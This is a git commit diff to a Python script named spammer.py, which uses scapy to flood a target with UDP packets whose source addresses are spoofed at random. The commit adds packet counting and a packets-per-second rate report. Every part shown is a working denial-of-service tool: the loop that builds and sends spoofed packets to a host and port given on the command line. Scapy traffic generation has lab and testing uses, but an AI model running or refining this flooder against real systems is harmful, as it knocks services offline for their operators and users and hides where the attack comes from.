51ad9876e58c18e0d8d6301df3fb54978a245fa9
Kaspars Mickevics <kaspars@fx.lv>
2016-05-10 19:44:36 +0300

    Basic packet rate calculation added

--- scapy/spammer.py
+++ scapy/spammer.py
@@ -4,6 +4,8 @@ Spam target with spoofed UDP packets from random source IP addresses
 """
 import sys
 import random
+import datetime
+from Queue import Queue
 from scapy.all import IP,UDP,send
 
 def randomoctet():
@@ -13,7 +15,7 @@ def randomip():
     ip="{}.{}.{}.{}".format(randomoctet(),randomoctet(),randomoctet(),randomoctet())
     return ip
 
-def main():
+def main(packetcounter):
     if not len(sys.argv) == 2:
         print "Provide target as the first argument."
         print "Target example: 127.0.0.1:22"
@@ -30,7 +32,20 @@ def main():
             sport=int("{}".format(i))
             packets.append(IP(ttl=5,src=src,dst=dst)/UDP(sport=sport,dport=dport))
             print "Source {}:{} -> dst: {}:{}".format(src,sport,dst,dport)
+            packetcounter.put(i)
         send(packets)
 
 if __name__ == "__main__":
-    main()
+    start_time = datetime.datetime.now()
+    packetcounter=Queue()
+    try:
+        main(packetcounter)
+    except KeyboardInterrupt:
+        packets_sent= packetcounter.qsize()
+        running_time_delta = datetime.datetime.now() - start_time
+        running_time = running_time_delta.total_seconds()
+        rate = packets_sent / running_time
+        print "Ctrl-c"
+        print "Ran for {} seconds".format(running_time)
+        print "Sent {} packets".format(packets_sent)
+        print "Rate: {} packets/s".format(rate)
